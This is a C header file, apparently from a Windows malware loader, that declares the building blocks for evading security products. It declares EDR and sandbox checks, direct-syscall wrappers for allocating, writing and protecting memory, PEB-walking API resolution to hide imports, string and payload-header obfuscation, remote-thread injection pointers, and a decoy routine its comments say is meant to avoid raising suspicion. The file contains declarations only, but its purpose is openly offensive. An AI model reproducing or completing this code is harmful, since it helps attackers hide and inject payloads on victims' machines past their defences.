#ifndef EVASION_H
#define EVASION_H

#include <windows.h>
#include <stdbool.h>

#define DEBUG false // if true, then print stuff. Noisy but you see what's goin on
#define EVADE true // if true, then performs EDR, SANDBOX, and other detection.
#define ARRAY_SIZE 1000
extern unsigned char DECKEY;

typedef enum
{
    DEBUG_ERROR,
    DEBUG_INFO,
    DEBUG_SUCCESS
} DEBUG_TYPE;

typedef LONG NTSTATUS;

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

// If DEBUG is true, declare the function normally.
#if DEBUG
    void myDebug(DEBUG_TYPE type, const char *format, ...);
// If DEBUG is false, replace all myDebug calls with a no-op macro.
#else
    #define myDebug(type, format, ...) ((void)0)
#endif

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    } DUMMYUNIONNAME;
    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef VOID (NTAPI *PIO_APC_ROUTINE)(
    IN PVOID ApcContext,
    IN PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG Reserved
); 

typedef enum _FILE_INFORMATION_CLASS {
    FileDirectoryInformation = 1,
    FileFullDirectoryInformation,
    FileBothDirectoryInformation,
    FileBasicInformation,
    FileStandardInformation,
    FileInternalInformation,
    FileEaInformation,
    FileAccessInformation,
    FileNameInformation,
    FileRenameInformation,
    FileLinkInformation,
    FileNamesInformation,
    FileDispositionInformation,
    FilePositionInformation,
    FileFullEaInformation,
    FileModeInformation,
    FileAlignmentInformation,
    FileAllInformation,
    FileAllocationInformation,
    FileEndOfFileInformation,
    FileAlternateNameInformation,
    FileStreamInformation,
    FilePipeInformation,
    FilePipeLocalInformation,
    FilePipeRemoteInformation,
    FileMailslotQueryInformation,
    FileMailslotSetInformation,
    FileCompressionInformation,
    FileObjectIdInformation,
    FileCompletionInformation,
    FileMoveClusterInformation,
    FileQuotaInformation,
    FileReparsePointInformation,
    FileNetworkOpenInformation,
    FileAttributeTagInformation,
    FileTrackingInformation,
    FileIdBothDirectoryInformation,
    FileIdFullDirectoryInformation,
    FileValidDataLengthInformation,
    FileShortNameInformation,
    FileIoCompletionNotificationInformation,
    FileIoStatusBlockRangeInformation,
    FileIoPriorityHintInformation,
    FileSfioReserveInformation,
    FileSfioVolumeInformation,
    FileHardLinkInformation,
    FileProcessIdsUsingFileInformation,
    FileNormalizedNameInformation,
    FileNetworkPhysicalNameInformation,
    FileIdGlobalTxDirectoryInformation,
    FileIsRemoteDeviceInformation,
    FileUnusedInformation,
    FileNumaNodeInformation,
    FileStandardLinkInformation,
    FileRemoteProtocolInformation,
    FileRenameInformationBypassAccessCheck,
    FileLinkInformationBypassAccessCheck,
    FileVolumeNameInformation,
    FileIdInformation,
    FileIdExtdDirectoryInformation,
    FileReplaceCompletionInformation,
    FileHardLinkFullIdInformation,
    FileIdExtdBothDirectoryInformation,
    FileDispositionInformationEx,
    FileRenameInformationEx,
    FileRenameInformationExBypassAccessCheck,
    FileDesiredStorageClassInformation,
    FileStatInformation,
    FileMemoryPartitionInformation,
    FileStatLxInformation,
    FileCaseSensitiveInformation,
    FileLinkInformationEx,
    FileLinkInformationExBypassAccessCheck,
    FileStorageReserveIdInformation,
    FileCaseSensitiveInformationForceAccessCheck,
    FileKnownFolderInformation,
    FileMaximumInformation
} FILE_INFORMATION_CLASS, *PFILE_INFORMATION_CLASS;

typedef struct _FILE_FULL_DIR_INFORMATION {
    ULONG         NextEntryOffset;
    ULONG         FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG         FileAttributes;
    ULONG         FileNameLength;
    ULONG         EaSize;
    WCHAR         FileName[1];
} FILE_FULL_DIR_INFORMATION, *PFILE_FULL_DIR_INFORMATION;

typedef struct _PEB_LDR_DATA {
  BYTE       Reserved1[8];
  PVOID      Reserved2[3];
  LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
  BYTE           Reserved1[16];
  PVOID          Reserved2[10];
  UNICODE_STRING ImagePathName;
  UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT TlsIndex;
    union {
        LIST_ENTRY HashLinks;
        struct {
            PVOID SectionPointer;
            ULONG CheckSum;
        };
    };
    union {
        ULONG TimeDateStamp;
        PVOID LoadedImports;
    };
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;


typedef VOID (NTAPI *PPS_POST_PROCESS_INIT_ROUTINE)(VOID);   

typedef struct _PEB {
  BYTE                          Reserved1[2];
  BYTE                          BeingDebugged;
  BYTE                          Reserved2[1];
  PVOID                         Reserved3[2];
  PPEB_LDR_DATA                 Ldr;
  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
  PVOID                         Reserved4[3];
  PVOID                         AtlThunkSListPtr;
  PVOID                         Reserved5;
  ULONG                         Reserved6;
  PVOID                         Reserved7;
  ULONG                         Reserved8;
  ULONG                         AtlThunkSListPtr32;
  PVOID                         Reserved9[45];
  BYTE                          Reserved10[96];
  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  BYTE                          Reserved11[128];
  PVOID                         Reserved12[1];
  ULONG                         SessionId;
} PEB, *PPEB;   

typedef struct _PROCESS_INFORMATION {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD  dwProcessId;
    DWORD  dwThreadId;
} PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;

typedef struct _STARTUPINFOA {
    DWORD  cb;
    LPSTR  lpReserved;
    LPSTR  lpDesktop;
    LPSTR  lpTitle;
    DWORD  dwX;
    DWORD  dwY;
    DWORD  dwXSize;
    DWORD  dwYSize;
    DWORD  dwXCountChars;
    DWORD  dwYCountChars;
    DWORD  dwFillAttribute;
    DWORD  dwFlags;
    WORD   wShowWindow;
    WORD   cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
} STARTUPINFOA, *LPSTARTUPINFOA;

// Function definition for modules.
typedef HMODULE (WINAPI *pMod)(LPCSTR);
typedef HMODULE (WINAPI *pLoadLibraryA_t)(LPCSTR);
typedef HMODULE (WINAPI *pGetModuleHandleA_t)(LPCSTR);
typedef FARPROC (WINAPI *pGetProcAddress_t)(HMODULE, LPCSTR);
typedef BOOL    (WINAPI *pPathFileExistsA_t)(LPCSTR);
typedef HANDLE  (WINAPI *pCreateRemoteThread_t)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL    (WINAPI *pCreateProcessA_t)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef DWORD   (WINAPI *pGetModuleFileNameA_t)(HMODULE, LPSTR, DWORD);
typedef HANDLE  (WINAPI *pCreateFileA_t)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef DWORD   (WINAPI *pGetFileSize_t)(HANDLE, LPDWORD);
typedef DWORD   (WINAPI *pWaitForSingleObject_t)(HANDLE, LPDWORD);
typedef BOOL    (WINAPI *pReadFile_t)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL    (WINAPI *pCloseHandle_t)(HANDLE);
typedef BOOL    (WINAPI *pResumeThread_t)(HANDLE);
typedef PCSTR   (WINAPI *pStrStrIA_t)(PCSTR, PCSTR); //StrStrIA from shlwapi->dll
typedef BOOL    (WINAPI *pFindClose_t)(HANDLE); // FindClose in fileapi->h, loaded in kernel32.dll
typedef BOOL    (WINAPI *pQueryPerformance_t)(LARGE_INTEGER*); //for QueryPerformanceFrequency and QueryPerformanceCounter
typedef BOOL    (WINAPI *pFreeLibrary_t)(HMODULE);

typedef struct _WINAPI_TABLE {
    pLoadLibraryA_t        pLoadLibraryA;
    pGetModuleHandleA_t    pGetModuleHandleA;
    pGetProcAddress_t      pGetProcAddress;
    pPathFileExistsA_t     pPathFileExistsA;
    pCreateRemoteThread_t  pCreateRemoteThread;
    pCreateProcessA_t      pCreateProcessA;
    pGetModuleFileNameA_t  pGetModuleFileNameA;
    pCreateFileA_t         pCreateFileA;
    pGetFileSize_t         pGetFileSize;
    pWaitForSingleObject_t pWaitForSingleObject;
    pReadFile_t            pReadFile;
    pCloseHandle_t         pCloseHandle;
    pResumeThread_t        pResumeThread;
    pStrStrIA_t            pStrStrIA;
    pFindClose_t           pFindClose;
    pQueryPerformance_t    pQueryPerformanceFrequency;
    pQueryPerformance_t    pQueryPerformanceCounter;
    pFreeLibrary_t         pFreeLibrary;
} WINAPI_TABLE;

/*
Headers of assembly functions for direct syscalls. See definitions in syscalls.asm.
CustAVM: NtAllocateVirtualMemory
*/
extern NTSTATUS CustAVM(HANDLE hProcess, PVOID *BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect); 
/*
Headers of assembly functions for direct syscalls. See definitions in syscalls.asm.
CustWVM: NtWriteVirtualMemory
*/
extern NTSTATUS CustWVM(HANDLE hProcess, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesWritten);
/*
Headers of assembly functions for direct syscalls. See definitions in syscalls.asm.
CustPVM: NtProtectVirtualMemory
*/
extern NTSTATUS CustPVM(HANDLE hProcess, PVOID *BaseAddress, PSIZE_T BufferSize, ULONG NewAccessProtection, PULONG OldAccessProtection);

/*
Headers of assembly functions for direct syscalls. See definitions in syscalls.asm.
CustQDF: NtQueryDirectoryFile
*/
extern NTSTATUS CustQDF(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileMask, BOOLEAN RestartScan);

/**
 *--------------------------------------------------------------------------------------
 *      Obfuscator - A library for obfuscating strings in a program.
 *      Adapted from https://github.com/4g3nt47/Obfuscator
 *                                                                    Author: Umar Abdul
 *--------------------------------------------------------------------------------------
 */
char *obfs_decode(unsigned char key, const char str[]);

/**
 * Tweak version of obfs_encode for decoding the payload header (encoded)
 */
void obfs_pdecode(unsigned char key, unsigned char *data, size_t len);

/* Decoy function
This function will generate 1,000 random numbers, sort them, and compute the average.
It looks like legitimate processing activity without raising suspicion.
*/
void SortNumbers();

/*
The GetMod function is a stealthy Windows API resolver that locates a function within a specific module without using GetModuleHandle or GetProcAddress.
Instead, it manually traverses the Process Environment Block (PEB) to extract module and export function addresses.
1 - Access the Process Environment Block (PEB)
2 - Iterate Through the PEB Loader Data (LDR)
3 - Locate the Export Address Table (EAT)
4 - Return the Function Address
*/
pMod GetMod(LPCSTR mod, LPCSTR fn);

#ifdef _M_X64
#define PEB_OFFSET 0x60
#else
#define PEB_OFFSET 0x30
#endif

#endif // EVASION_H
